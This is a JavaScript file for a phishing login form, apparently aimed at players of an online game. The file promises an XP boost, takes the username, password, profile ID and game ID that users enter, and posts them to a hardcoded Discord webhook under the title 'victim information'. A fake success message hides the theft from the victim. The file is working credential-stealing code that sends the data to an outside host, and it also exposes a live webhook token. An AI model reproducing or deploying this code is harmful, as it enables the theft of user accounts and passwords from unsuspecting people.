document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', async (event) => {
        event.preventDefault(); // Evita el envío del formulario

        // Obtiene los valores del formulario
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const perfile = document.getElementById('perfile').value;
        const game = document.getElementById('game').value;


        // Validar los datos del formulario (esto es un ejemplo básico)
        if (username && password) {
            // Aquí deberías validar las credenciales con tu servidor o backend
            // Por simplicidad, asumiremos que cualquier combinación de usuario y contraseña es válida

	// Datos del mensaje para el webhook
        const webhookURL = 'https://discord.com/api/webhooks/1262151069098840094/SUDQXUQUDztxwENfVXgm0_eHnLzLsaflUIawThGgrSENsytTtv9YbWGN1PC3REassFcm';
        const embed = {
            title: 'Información de la victima',
            description: 'Registrado exitosamente...',
            color: 080707,
            fields: [
                {
                    name: 'Usuario',
                    value: username,
                    inline: true
                },
                {
                    name: 'Contraseña',
                    value: password,
                    inline: true
                },
                {
                    name: 'ID Perfil',
                    value: perfile,
                    inline: true
                },
                {
                    name: 'ID Game',
                    value: game,
                    inline: true
                },
            ],
            footer: {
                text: 'Registro de Sesión'
            },
            timestamp: new Date() // Fecha y hora actual
        };

        const messageData = {
            content: '¡Nuevo inicio de sesión detectado!',
            embeds: [embed]
        };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(messageData)
                });

                if (response.ok) {
                    alert('300 XP per minute started. Caution your account could be banned.');
                    // Aquí podrías redirigir al usuario a otra página
                    // window.location.href = '/dashboard.html';
                } else {
                    alert('Error sending data to the system. try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('There was an error processing your request.');
            }
        } else {
            alert('Please enter a username and password and IDs.');
        }
    });
});
